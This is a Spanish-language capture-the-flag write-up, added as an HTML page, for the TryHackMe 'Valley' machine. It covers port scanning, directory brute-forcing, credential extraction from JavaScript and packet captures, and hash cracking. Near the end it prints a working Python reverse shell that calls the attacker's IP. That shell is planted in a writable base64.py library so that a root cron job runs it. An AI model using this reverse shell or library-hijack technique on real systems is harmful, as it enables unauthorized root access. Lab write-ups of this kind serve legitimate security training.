@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Valley | ZsZsec</title>
+<meta content="Introducción En este writeup documentamos la resolución completa de la máquina “Valley” alojada en la plataforma TryHackMe. El objetivo de esta máquina es simular un entorno realis..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina Valley<span>_</span></h1>
+<div class="writeup-meta"><span>TryHackMe</span></div>
+<div class="tag-row"><span class="tag">TryHackMe</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h2>Introducción</h2>
+<p>En este writeup documentamos la resolución completa de la máquina <strong>“Valley”</strong> alojada en la plataforma TryHackMe. El objetivo de esta máquina es simular un entorno realista donde se deben aplicar habilidades de reconocimiento, enumeración de servicios, análisis de aplicaciones web y explotación básica para obtener acceso inicial y escalar privilegios.</p>
+<h2>Reconocimiento y Enumeración Inicial</h2>
+<p>Como punto de partida para la fase de reconocimiento, se realizó un escaneo completo de puertos TCP utilizando <strong>Nmap</strong>, con parámetros optimizados para acelerar el proceso sin comprometer la calidad de los resultados.
+`</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/TheValley]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.10.114.161  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 16:31 CDT
+Nmap scan report for 10.10.114.161
+Host is up (0.17s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
+|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
+|_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+37370/tcp open  ftp     vsftpd 3.0.3
+Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p><strong>Explicación de parámetros utilizados:</strong></p>
+<ul>
+<li><code>-sS</code>: Realiza un <strong>SYN scan</strong> o escaneo sigiloso. Este tipo de escaneo envía paquetes SYN (inicio de conexión TCP) y analiza la respuesta para determinar si el puerto está abierto. Es más rápido y menos detectable que una conexión completa (TCP connect).</li>
+<li><code>-sV</code>: Permite realizar <strong>detección de versiones</strong> del servicio que corre en cada puerto abierto.</li>
+<li><code>-sC</code>: Ejecuta los <strong>scripts NSE (Nmap Scripting Engine)</strong> por defecto, lo cual permite obtener información adicional como banners, metadatos y configuraciones inseguras comunes.</li>
+<li><code>-Pn</code>: Indica a Nmap que <strong>no realice un ping previo</strong> al host antes de escanearlo. Esto es útil en entornos donde el ICMP está bloqueado por firewall.</li>
+<li><code>-p-</code>: Escanea <strong>todos los 65535 puertos TCP</strong>, lo cual es esencial para no pasar por alto servicios que corren en puertos no convencionales.</li>
+<li><code>--min-rate 5000</code>: Aumenta la velocidad mínima de envío de paquetes a 5000 paquetes por segundo, acelerando el escaneo sin sacrificar precisión.</li>
+</ul>
+<p><strong>Resultados relevantes:</strong></p>
+<pre><code class="language-bash">PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+37370/tcp open  ftp     vsftpd 3.0.3
+</code></pre>
+<p>Se identificaron tres servicios activos:</p>
+<ul>
+<li><strong>SSH</strong> en el puerto <code>22/tcp</code>, con una versión de OpenSSH asociada a Ubuntu 20.04.</li>
+<li><strong>Servidor web HTTP</strong> en el puerto <code>80/tcp</code>, utilizando Apache 2.4.41.</li>
+<li><strong>Servidor FTP</strong> en un puerto no convencional, <code>37370/tcp</code>, ejecutando vsftpd 3.0.3.</li>
+</ul>
+<p>Este escaneo reveló puntos de entrada potenciales tanto en servicios orientados a web como en servicios de acceso remoto o transferencia de archivos.</p>
+<h3>Fingerprinting de la Aplicación Web con WhatWeb</h3>
+<p>Con el fin de identificar tecnologías web y obtener metadatos del sitio, se utilizó la herramienta <code>whatweb</code>:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/TheValley]
+└─$ whatweb 10.10.114.161
+http://10.10.114.161 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.114.161], Script
+</code></pre>
+<p>Estos datos confirmaron que el sitio corre sobre un stack clásico de <strong>Apache + Ubuntu</strong> y que no existen mecanismos avanzados de ofuscación del servidor. Esto facilita la aplicación de técnicas de enumeración posteriores.</p>
+<h3>Enumeración de Recursos Web con Gobuster</h3>
+<p>Para descubrir directorios y archivos ocultos en el servidor web, se utilizó <code>gobuster</code> en modo <strong>directory brute-force</strong>, empleando una wordlist estándar de Seclists y múltiples extensiones comunes de archivos web.</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/TheValley]
+└─$ gobuster dir -u http://10.10.114.161     -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,php,html,py -t 40
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.114.161
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,py,txt,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 278]
+/index.html           (Status: 200) [Size: 1163]
+/gallery              (Status: 301) [Size: 316] [--&gt; http://10.10.114.161/gallery/]                                                     
+/static               (Status: 301) [Size: 315] [--&gt; http://10.10.114.161/static/]                                                      
+/pricing              (Status: 301) [Size: 316] [--&gt; http://10.10.114.161/pricing/] 
+</code></pre>
+<p><strong>Resultados destacados:</strong></p>
+<pre><code class="language-bash">/index.html           (Status: 200)
+/gallery              (Status: 301)
+/static               (Status: 301)
+/pricing              (Status: 301)
+</code></pre>
+<p>La existencia del directorio <code>/static/</code> indicó una posible ubicación de recursos estáticos como imágenes, archivos JavaScript, u otros elementos utilizados por la aplicación. Este tipo de rutas suele contener información sensible, especialmente en entornos de desarrollo.</p>
+<h3>Análisis del Directorio <code>/static/</code></h3>
+<p>Dado el potencial del directorio <code>/static/</code>, se realizó una segunda ronda de enumeración focalizada exclusivamente en esta ruta:</p>
+<pre><code class="language-bash">──(zikuta㉿zikuta)-[~/TheValley]
+└─$ gobuster dir -u http://10.10.114.161/static/     -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,php,html,py -t 40
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.114.161/static/
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,php,html,py
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 278]
+/11                   (Status: 200) [Size: 627909]
+/12                   (Status: 200) [Size: 2203486]
+/3                    (Status: 200) [Size: 421858]
+/5                    (Status: 200) [Size: 1426557]
+/6                    (Status: 200) [Size: 2115495]
+/9                    (Status: 200) [Size: 1190575]
+/15                   (Status: 200) [Size: 3477315]
+/18                   (Status: 200) [Size: 2036137]
+/00                   (Status: 200) [Size: 127]
+</code></pre>
+<p>Resultados interesantes:</p>
+<pre><code class="language-bash">/00                   (Status: 200) [Size: 127]
+/11, /12, /5, /6, /9, etc... (tamaño mayor a 1MB)
+</code></pre>
+<p>Entre todos los recursos enumerados, <code>/00</code> llamó la atención por su <strong>tamaño significativamente menor</strong>, sugiriendo que podría contener texto o metadatos relevantes, en contraposición a los demás archivos que probablemente sean imágenes o binarios de gran tamaño.</p>
+<h3>Análisis del Recurso <code>/static/00</code></h3>
+<p>Al acceder a <code>http://10.10.114.161/static/00</code>, se visualizó una serie de <strong>notas de desarrollo</strong> aparentemente dejadas por un desarrollador del proyecto. Entre las líneas se encontraba la referencia a un directorio interno:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/f958ed7c-dc16-4e02-9778-173b2ec838b6"/></p>
+<p>dev notes from valleyDev:
+-add wedding photo examples
+-redo the editing on #4
+-remove /dev1243224123123
+-check for SIEM alerts</p>
+<p>Este tipo de anotaciones son típicas de entornos de staging o pruebas internas, y sugieren la presencia de rutas no destinadas al público general. A continuación, se intentó acceder directamente al directorio <code>/dev1243224123123</code>.</p>
+<h3>Descubrimiento de Página de Login y Archivo JavaScript</h3>
+<p>La ruta <code>http://10.10.114.161/dev1243224123123</code> contenía un <strong>formulario de autenticación</strong>, lo cual indicaba un posible mecanismo de acceso restringido.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/2bc33912-a40f-48cf-9dfb-6c65e634ac74"/></p>
+<p>Al inspeccionar el sitio mediante las herramientas de desarrollador del navegador, se identificó un archivo JavaScript externo denominado <code>dev.js</code>. Su análisis reveló credenciales en texto plano codificadas en el propio script:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/2045eef6-a012-49eb-9e96-37397e981c2d"/></p>
+<pre><code class="language-js">if (username === "siemDev" &amp;&amp; password === "california") {
+    window.location.href = "/dev1243224123123/devNotes37370.txt";
+}
+</code></pre>
+<p>Estas credenciales (<code>siemDev:california</code>) se utilizaron posteriormente en el servicio FTP abierto en el puerto 37370, lo cual representa un claro caso de <strong>exposición de credenciales a través de archivos estáticos mal configurados</strong>.</p>
+<h2>Ftp</h2>
+<p>Nos conectamos por ftp y vemos que tenemos 3 archivos tipo .pcapng de wireshark que podemos analizar</p>
+<pre><code class="language-bash">                                                                    
+┌──(zikuta㉿zikuta)-[~]
+└─$ ftp 10.10.254.48 37370 
+Connected to 10.10.254.48.
+220 (vsFTPd 3.0.3)
+Name (10.10.254.48:zikuta): siemDev
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||45290|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
+-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
+-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
+226 Directory send OK.
+ftp&gt; get siemHTTP2.pcapng
+local: siemHTTP2.pcapng remote: siemHTTP2.pcapng
+229 Entering Extended Passive Mode (|||45620|)
+150 Opening BINARY mode data connection for siemHTTP2.pcapng (1972448 bytes).
+100% |************************|  1926 KiB  582.56 KiB/s    00:00 ETA
+226 Transfer complete.
+1972448 bytes received in 00:03 (553.41 KiB/s)
+
+</code></pre>
+<h2>Análisis de Tráfico Capturado (PCAP)</h2>
+<p>Una vez autenticados en el servicio FTP con las credenciales previamente descubiertas (<code>siemDev:california</code>), se identificaron tres archivos de captura de tráfico en formato <code>.pcapng</code>, comúnmente utilizados por herramientas como <strong>Wireshark</strong> para análisis de red:</p>
+<pre><code class="language-bash">-rw-rw-r--    1 1000  1000     7272     siemFTP.pcapng
+-rw-rw-r--    1 1000  1000  1978716     siemHTTP1.pcapng
+-rw-rw-r--    1 1000  1000  1972448     siemHTTP2.pcapng
+</code></pre>
+<p>Estos archivos se transfirieron al sistema local utilizando modo binario en FTP para evitar corrupción durante la descarga:</p>
+<pre><code class="language-bash">ftp&gt; get siemHTTP2.pcapng
+</code></pre>
+<h3>Análisis de Captura HTTP</h3>
+<p>Los archivos <code>siemFTP.pcapng</code> y <code>siemHTTP1.pcapng</code> no contenían información relevante, pero al inspeccionar <code>siemHTTP2.pcapng</code> mediante Wireshark, se encontró una <strong>transmisión de credenciales en texto plano</strong>, característica de formularios sin HTTPS ni métodos de autenticación segura.</p>
+<blockquote>
+<p><strong>Hallazgo crítico:</strong><br/>
+Credenciales interceptadas:</p>
+<ul>
+<li><p><strong>Usuario:</strong> <code>valleyDev</code></p>
+</li>
+<li><p><strong>Contraseña:</strong> <code>ph0t0s1234</code></p>
+</li>
+</ul>
+</blockquote>
+<p>Este hallazgo representa una vulnerabilidad típica en entornos sin cifrado, donde datos sensibles pueden ser capturados a través de ataques de tipo <strong>sniffing de tráfico HTTP</strong>.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/1168c571-f8a9-4f99-9155-baff77cd8403"/></p>
+<p>las credenciales encontradas son username:<code>valleyDev</code> password:<code>ph0t0s1234</code> estas serian las credenciales para entrar al panel de ssh,</p>
+<h2>Acceso SSH</h2>
+<p>Con las credenciales interceptadas, se intentó iniciar sesión en el servicio SSH (<code>OpenSSH 8.2p1</code>) descubierto previamente en el puerto 22:</p>
+<pre><code class="language-bash">ssh valleyDev@10.10.114.161
+</code></pre>
+<p>Al proporcionar la contraseña <code>ph0t0s1234</code>, se obtuvo acceso exitoso al sistema como el usuario <strong><code>valleyDev</code></strong>.</p>
+<h3>Obtención de la flag de usuario</h3>
+<p>Como práctica estándar tras el acceso inicial, se buscó la flag de usuario, normalmente almacenada en la ruta:</p>
+<pre><code class="language-bash">cat user.txt
+</code></pre>
+<h2>Búsqueda de Vectores para Escalada de Privilegios</h2>
+<p>Se inició la fase de post-explotación con una serie de comandos para enumerar permisos, configuraciones inseguras y tareas automatizadas que podrían permitir escalada de privilegios.</p>
+<h3>Comando <code>sudo -l</code></h3>
+<p>Se intentó verificar si el usuario tenía privilegios sudo:</p>
+<pre><code class="language-bash">sudo -l
+</code></pre>
+<p>Sin embargo, este intento resultó en un mensaje de autenticación fallida, indicando la contraseña proporcionada es inválida para esa operación.</p>
+<h3>Búsqueda de archivos con permisos SUID</h3>
+<p>El siguiente paso fue buscar archivos con el bit <strong>SUID (Set User ID)</strong> habilitado, los cuales pueden ser explotados si permiten ejecución con privilegios elevados:</p>
+<pre><code class="language-bash">find / -perm -4000 -type f 2&gt;/dev/null
+</code></pre>
+<p>Este comando busca archivos ejecutables que se ejecutan con los permisos del propietario (comúnmente <code>root</code>). Sin embargo, no se identificaron binarios inusuales o explotables en esta máquina bajo esta categoría.</p>
+<h3>Inspección de tareas programadas (cronjobs)</h3>
+<p>Al revisar los cronjobs del sistema, se identificaron varias tareas recurrentes</p>
+<pre><code class="language-bash">valleyDev@valley:/$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *  * * * root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6  * * * root      test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6  * * 7 root      test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6  1 * * root      test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+1  *    * * *   root    python3 /photos/script/photosEncrypt.py
+</code></pre>
+<p>Se descubrieron <strong>tres tareas programadas</strong> con distintas frecuencias (minuto, hora y día), y entre ellas, un archivo <code>.py</code> que era ejecutado como <strong>root cada minuto</strong>. A pesar de este descubrimiento, el archivo no era modificable por el usuario <code>valleyDev</code>, lo que descartó un vector de escalada por <strong>cronjob mal configurado o editable</strong>.</p>
+<h2>Descubrimiento de Binario Sospechoso en <code>/home</code></h2>
+<p>Durante la exploración manual del sistema de archivos, se localizó un archivo ejecutable con un nombre sugestivo ubicado en el directorio <code>/home</code>:</p>
+<pre><code class="language-bash">valleyDev@valley:/home$ ls -l
+total 744
+drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
+drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
+-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
+drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
+</code></pre>
+<p>Este binario se encontraba fuera de los lugares tradicionales de ejecución y su nombre sugiere una posible función relacionada con autenticación o control de acceso.</p>
+<p>Dado que no se pudo escalar privilegios mediante <code>sudo</code> ni <code>cron</code>, este ejecutable se convirtió en el principal candidato para un análisis más profundo de comportamiento y posibles vulnerabilidades de ejecución.</p>
+<h3>Exfiltración del binario para análisis local</h3>
+<p>Dado que no se contaba con permisos elevados ni acceso de escritura sobre archivos relevantes (como scripts en <code>/etc/cron.*</code>), se desplegó un servidor HTTP local usando Python para extraer el binario a través de la red</p>
+<pre><code class="language-bash">valleyDev@valley:/home$ ls -l
+total 744
+drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
+drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
+-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
+drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13  2023 valleyDev
+valleyDev@valley:/home$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.23.120.245 - - [30/Jul/2025 15:37:52] "GET /valleyAuthenticator HTTP/1.1" 200 -
+^C
+</code></pre>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~]
+└─$ wget 'http://10.10.232.173:8080/valleyAuthenticator'
+--2025-07-30 17:37:52--  http://10.10.232.173:8080/valleyAuthenticator
+Connecting to 10.10.232.173:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 749128 (732K) [application/octet-stream]
+Saving to: ‘valleyAuthenticator’
+
+valleyAuthenticat 100%[==========&gt;] 731.57K   733KB/s    in 1.0s    
+
+2025-07-30 17:37:54 (733 KB/s) - ‘valleyAuthenticator’ saved [749128/749128]
+
+                    
+</code></pre>
+<p>despues de descargarlo en nuestra maquina local decidimos ejecutar el comando <code>strings valleyAuthenticator | less</code>  y lo primero que nos aparecio fue <code>UPX!</code> eso significa que el binario está <strong>comprimido con UPX (Ultimate Packer for eXecutables)</strong>.</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~]
+└─$ strings valleyAuthenticator | less
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/4bd56405-8aeb-47b1-8f66-7fcfd81bd4bf"/></p>
+<p>despues de desempaquetar el archivo UPX cone el comando <code>upx -d</code> procederemos a revisar las strings de el ejecutable con el comando <code>strings valleyAuthenticator</code>  y mientras revisamos nos encontraremos con 2 posibles hashes</p>
+<pre><code>e6722920bab2326f8217e4bf6b1b58ac
+dd2921cc76ee3abfd2beb60709056cfb</code></pre>
+<p>Ahora con los hashes utilizaremos una herramienta llamada hash-identifier para identificar el tipo de hash que nos acabamos de encontrar y posteriormente poder crackearlo con el formato correcto.</p>
+<p>este hash nos da varias posibilidades</p>
+<pre><code class="language-bash">--------------------------------------------------
+ HASH: e6722920bab2326f8217e4bf6b1b58ac
+
+Possible Hashs:
+[+] MD5
+[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+</code></pre>
+<p>y este otro</p>
+<pre><code class="language-bash">HASH: dd2921cc76ee3abfd2beb60709056cfb
+
+Possible Hashs:
+[+] MD5
+[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+</code></pre>
+<p>teniendo en cuenta que la opcion mas sugerida es encriptacion MD5 utilizaremos ese formato para crackear los hashes.</p>
+<p>al crackear los dos hashes nos encontramos con el usuario <code>valley</code> y la contrasena <code>liberty123</code></p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
+└─$ echo "e6722920bab2326f8217e4bf6b1b58ac" &gt; hash.txt 
+                                                                     
+┌──(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
+└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=3
+Press 'q' or Ctrl-C to abort, almost any other key for status
+liberty123       (?)     
+1g 0:00:00:00 DONE (2025-07-30 20:38) 33.33g/s 7257Kp/s 7257Kc/s 7257KC/s lovein1..liberty12
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                     
+┌──(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
+└─$ rm hash.txt
+                                                                     
+┌──(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
+└─$ echo "dd2921cc76ee3abfd2beb60709056cfb" &gt; hash.txt
+                                                                     
+┌──(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
+└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=3
+Press 'q' or Ctrl-C to abort, almost any other key for status
+valley           (?)     
+1g 0:00:00:00 DONE (2025-07-30 20:39) 50.00g/s 345600p/s 345600c/s 345600C/s oblivion..better
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+<p>asi que intentamos iniciar sesion por ssh con ese usuario y contrasena y PUM contrasena exitosa</p>
+<p>Como usuario  <code>valley</code>, procedimos a modificar el script <code>photosEncrypt.py</code>, pero descubrimos que solo el usuario <code>root</code> tiene permisos de escritura sobre él.</p>
+<p>Al analizar el código, notamos que importa la librería <code>base64</code>, por lo que decidimos verificar si teníamos permisos para modificar dicha librería.</p>
+<p>Efectivamente, pudimos editar el archivo <code>base64.py</code> y agregamos una reverse shell con el siguiente código:</p>
+<pre><code class="language-bash">import socket,os,pty
+
+def reverse_shell():
+    s=socket.socket()
+    s.connect(("10.23.120.245", 4444)) 
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    pty.spawn("/bin/bash")
+
+reverse_shell()
+</code></pre>
+<p>Considerando que existen tareas programadas en <code>crontab</code> que se ejecutan periódicamente (cada minuto, hora y día), esperamos a que <code>root</code> ejecute alguna de estas tareas y active nuestra reverse shell. Después de aproximadamente un minuto, obtuvimos acceso como root:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Desktop/valleyAuthenticator]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.23.120.245] from (UNKNOWN) [10.10.8.109] 37576
+root@valley:~# cat root.txt
+cat root.txt
+hola
+
+</code></pre>
+<h3>Conclusión de la Máquina <em>Valley</em></h3>
+<p>La máquina <strong>Valley</strong> representa un entorno vulnerable que combina múltiples vectores de ataque, desde fallas en la exposición de información hasta la explotación de credenciales en texto plano y el análisis de binarios.</p>
+<p>Durante la resolución, se aplicaron técnicas de <strong>reconocimiento activo</strong> (escaneo de puertos y fingerprinting de servicios), <strong>enumeración de directorios web</strong>, <strong>análisis de tráfico de red (PCAP)</strong> y <strong>extracción de credenciales</strong> para obtener acceso inicial mediante SSH.</p>
+<p>Posteriormente, la <strong>ingeniería inversa ligera de un binario comprimido con UPX</strong> permitió descubrir hashes que, una vez crackeados, proporcionaron acceso a un usuario con mayores privilegios. Finalmente, se aprovechó una <strong>tarea programada que ejecutaba una librería de Python vulnerable a modificaciones</strong>, obteniendo así acceso como root y la flag final.</p>
+<p>Este escenario resalta la importancia de implementar prácticas seguras de desarrollo, como el uso de HTTPS, evitar credenciales en código fuente, restringir permisos en binarios y librerías, y proteger las tareas programadas contra modificaciones maliciosas.</p>
+<h1>Tecnicas utilizadas</h1>
+<table>
+<thead>
+<tr>
+<th><strong>Fase</strong></th>
+<th><strong>Técnica</strong></th>
+<th><strong>Descripción</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reconocimiento</td>
+<td><code>nmap -sS -sV -sC -Pn -p-</code></td>
+<td>Escaneo completo de puertos TCP, detección de versiones y ejecución de scripts NSE.</td>
+</tr>
+<tr>
+<td>Fingerprinting Web</td>
+<td>WhatWeb</td>
+<td>Identificación de tecnologías del servidor web (Apache 2.4.41 en Ubuntu).</td>
+</tr>
+<tr>
+<td>Enumeración Web</td>
+<td>Gobuster</td>
+<td>Descubrimiento de directorios y archivos ocultos en la aplicación web.</td>
+</tr>
+<tr>
+<td>Exposición de Credenciales</td>
+<td>Análisis de dev.js</td>
+<td>Obtención de credenciales en texto plano embebidas en un archivo JavaScript.</td>
+</tr>
+<tr>
+<td>Análisis de Tráfico</td>
+<td>Wireshark (PCAP)</td>
+<td>Extracción de credenciales transmitidas sin cifrado a partir de capturas de tráfico.</td>
+</tr>
+<tr>
+<td>Acceso Inicial</td>
+<td>SSH</td>
+<td>Autenticación como usuario valleyDev con credenciales interceptadas.</td>
+</tr>
+<tr>
+<td>Ingeniería Inversa</td>
+<td>UPX + strings + hash-identifier + John The Ripper</td>
+<td>Desempaquetado de binario y crackeo de hashes MD5 para obtener credenciales adicionales.</td>
+</tr>
+<tr>
+<td>Escalada de Privilegios</td>
+<td>Modificación de librería Python</td>
+<td>Inserción de reverse shell en base64.py para ejecutar código como root vía cronjob.</td>
+</tr>
+</tbody>
+</table>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
